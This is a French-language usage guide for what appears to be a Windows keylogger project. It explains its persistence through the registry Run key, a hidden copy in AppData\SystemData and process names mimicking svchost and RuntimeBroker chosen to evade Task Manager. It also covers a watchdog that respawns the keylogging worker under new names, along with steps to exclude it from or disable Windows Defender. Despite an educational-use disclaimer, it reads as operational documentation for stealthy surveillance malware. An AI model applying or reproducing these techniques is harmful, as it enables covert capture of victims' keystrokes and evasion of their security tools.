# 🔄 Guide de Persistence et Auto-Redémarrage

Ce guide explique comment utiliser les fonctionnalités de persistence et d'auto-redémarrage.

## 🎯 Fonctionnalités

### 1. Persistence au Démarrage
- ✅ **Auto-start au démarrage de Windows**
- ✅ **Installation automatique dans le registre**
- ✅ **Copie cachée dans AppData\SystemData**
- ✅ **Nom de processus aléatoire**

### 2. Auto-Redémarrage
- ✅ **Redémarre automatiquement si le processus est tué**
- ✅ **Génère un nouveau nom aléatoire à chaque redémarrage**
- ✅ **Surveille en permanence**
- ✅ **Redémarrages illimités**

### 3. Noms de Processus Aléatoires
- ✅ **Imite les vrais processus Windows** (svchost, RuntimeBroker, etc.)
- ✅ **Nouveau nom à chaque installation/redémarrage**
- ✅ **Difficile à détecter dans le Gestionnaire de tâches**

## 📋 Configuration

### Dans le Builder

Lors de la compilation avec `builder_advanced.py`, la persistence est **automatiquement activée**.

### Configuration Manuelle

Éditez `src/windows/keylogger_windows_advanced.py` :

```python
# Persistence activée par défaut
ENABLE_PERSISTENCE = True  # ✅ Activé

# Noms aléatoires activés
USE_RANDOM_NAMES = True    # ✅ Activé
```

## 🚀 Utilisation

### Un Seul Fichier .exe - Tout Intégré !

Le watchdog est maintenant **intégré directement** dans le keylogger. Un seul fichier fait tout !

**Étapes :**

1. **Builder le projet**
   ```powershell
   python tools/builder_advanced.py
   ```

2. **Lancer l'exécutable**
   ```powershell
   build/dist/[nom].exe
   ```

**Ce qui se passe automatiquement :**
- ✅ Le programme démarre en **mode watchdog**
- ✅ Installe la **persistence** dans le registre
- ✅ Se copie dans `AppData\SystemData` avec un **nom aléatoire**
- ✅ Lance un processus **worker** (qui fait le keylogging)
- ✅ **Surveille** le worker en permanence
- ✅ Si le worker est tué → **redémarre** automatiquement avec nouveau nom
- ✅ Au boot du PC → **redémarre** automatiquement
- ✅ **Redémarrages illimités**

### Comment ça Fonctionne ?

Quand vous lancez le .exe, il fonctionne en 2 modes :

**Mode 1 : Watchdog** (par défaut)
- Lancé quand vous double-cliquez sur le .exe
- S'installe pour démarrer au boot
- Lance le mode Worker et le surveille
- Redémarre le Worker s'il est tué

**Mode 2 : Worker** (automatique)
- Lancé par le Watchdog avec l'argument `--worker`
- Fait le vrai travail de keylogging
- Utilise un nom aléatoire différent à chaque lancement
- Surveillé par le Watchdog parent

## 🔍 Vérification

### Vérifier la Persistence

**1. Registre Windows**
```powershell
# Ouvrir l'éditeur de registre
regedit

# Aller à :
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

# Chercher une entrée avec un nom comme :
# - svchost
# - RuntimeBroker
# - SystemService
# etc.
```

**2. Dossier Caché**
```powershell
# Ouvrir l'explorateur de fichiers
# Aller à :
%APPDATA%\SystemData

# Si le dossier est caché, activer "Afficher les fichiers cachés"
```

**3. Gestionnaire de Tâches**
```powershell
# Ouvrir le Gestionnaire de tâches (Ctrl+Shift+Esc)
# Onglet "Détails"
# Chercher des processus avec les noms générés
```

## ⚙️ Noms de Processus Générés

Le système génère des noms qui imitent les vrais processus Windows :

### Noms de Processus Communs
- `svchost` (avec ou sans numéro : svchost, svchost42)
- `csrss`
- `RuntimeBroker`
- `SearchApp`
- `SystemSettings`
- `WindowsUpdate`
- `SecurityHealthService`
- `explorer`
- `dwm`
- `conhost`

### Noms Générés
- `SystemService`
- `WindowsHost`
- `MicrosoftManager`
- `RuntimeHelper`
- `ServiceHandler`
- `UpdateProcess`
- etc.

## 🛡️ Désactivation

### Pour Désactiver la Persistence

**Avant Compilation :**
```python
# Dans keylogger_windows_advanced.py
ENABLE_PERSISTENCE = False
```

**Après Installation :**
1. Supprimer l'entrée du registre
   ```powershell
   # Dans regedit, aller à :
   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   # Supprimer l'entrée avec le nom du processus
   ```

2. Supprimer le fichier caché
   ```powershell
   # Supprimer le dossier
   rmdir /s /q "%APPDATA%\SystemData"
   ```

### Pour Désactiver les Noms Aléatoires

```python
# Dans keylogger_windows_advanced.py
USE_RANDOM_NAMES = False
```

## 📊 Fonctionnalités Intégrées

Le watchdog est maintenant **toujours actif** par défaut :

| Feature | Status |
|---------|--------|
| Démarre au boot | ✅ Oui |
| Noms aléatoires | ✅ Oui |
| Redémarre si tué | ✅ Oui (5 sec) |
| Changement de nom à chaque redémarrage | ✅ Oui |
| Surveillance continue | ✅ Oui |
| Redémarrages illimités | ✅ Oui |
| Un seul fichier .exe | ✅ Oui |

## ⚠️ Avertissements

### Légal
- **Utilisez uniquement sur des systèmes que vous possédez**
- **Obtenez une autorisation écrite explicite**
- **À des fins éducatives et de test uniquement**

### Technique
- La persistence peut être détectée par les antivirus
- Windows Defender peut bloquer l'exécution
- Ajoutez des exceptions dans l'antivirus pour les tests
- **Testez d'abord dans une machine virtuelle**

### Désinstallation
- Gardez une trace de où le programme s'installe
- Documentez les noms de processus générés
- Sauvegardez les chemins d'installation

## 🔧 Dépannage

### La Persistence Ne Fonctionne Pas

**Vérifiez :**
1. Droits d'administration (pas nécessaire mais aide)
2. Antivirus désactivé ou exception ajoutée
3. L'exécutable est bien compilé (pas un script Python)

**Solution :**
```powershell
# Vérifier les logs de Windows
eventvwr.msc
# Aller à : Windows Logs > Application
```

### Le Worker Ne Redémarre Pas

**Vérifiez :**
1. Le processus watchdog (nom aléatoire) est toujours actif
2. Pas bloqué par l'antivirus
3. Le dossier AppData\SystemData existe et contient les copies

**Test :**
```powershell
# Ouvrir le Gestionnaire de tâches
# Trouver le processus worker (ex: svchost, RuntimeBroker, etc.)
taskkill /F /IM [nom_worker_processus].exe

# Observer dans le Gestionnaire de tâches
# Un nouveau processus avec un NOUVEAU NOM devrait apparaître dans 5 secondes
```

**Conseil :** Le watchdog et le worker ont des noms différents. Le watchdog ne doit PAS être tué.

### Processus Bloqué par Windows Defender

**Solutions :**
1. Ajouter une exception dans Windows Defender
   - Paramètres > Mise à jour et sécurité > Sécurité Windows
   - Protection contre les virus et menaces
   - Gérer les paramètres
   - Exclusions > Ajouter une exclusion
   - Ajouter le dossier `build/`

2. Désactiver temporairement Windows Defender (tests uniquement)

3. Utiliser une VM sans antivirus

## 📝 Notes

- **Un seul fichier .exe** fait tout (watchdog + keylogger intégré)
- Le watchdog s'installe et lance automatiquement le worker
- Le worker fait le vrai keylogging
- Chaque redémarrage du worker génère un **nouveau nom aléatoire**
- Les anciens fichiers workers sont automatiquement nettoyés
- Le watchdog reste actif en arrière-plan
- Vous verrez **2 processus** dans le Gestionnaire de tâches :
  1. **Watchdog** - Surveillance et relance
  2. **Worker** - Keylogging (nom change à chaque redémarrage)

---

**Pour toute question ou problème, vérifiez la documentation complète dans [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)**
